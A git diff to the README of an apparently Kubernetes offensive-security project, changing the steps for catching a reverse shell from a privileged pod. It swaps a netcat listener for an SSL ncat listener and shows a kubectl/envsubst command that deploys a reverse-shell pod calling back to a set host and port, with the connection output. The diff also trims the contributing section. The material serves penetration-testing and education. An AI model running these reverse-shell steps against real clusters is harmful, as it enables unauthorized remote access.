@@ -241,7 +241,7 @@ find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl delete -f 
 ### Create a reverse shell using the privileged pod
 Set up listener
 ```
-nc -nvlp 3116
+ncat --ssl -vlp 3116
 ```
 
 Create pod from local yaml without modifying it by using env variables and envsubst
@@ -250,14 +250,16 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kube
 ```
 Catch the shell 
 ```
-nc -nvlp 3116
-Listening on 0.0.0.0 3116
+ncat --ssl -vlp 3116
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: Listening on :::3116
+Ncat: Listening on 0.0.0.0:3116
 
 Connection received on 10.0.0.162 42035
 ```
 
 # Contributing
-Have you run into a situation where there was a restrictive policy, but you were still able to gain elevated access with only a subset of privileges or capabilities? If so, please consider sharing the yaml and the privesc steps, and we'll add it as a new badPod type. 
-
+Pull requests and issue welcome.
 # Acknowledgements 
 Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), and [Eviatar Gerzi](https://twitter.com/g3rzi) for publicly sharing so much knowledge about Kubernetes offensive security. 
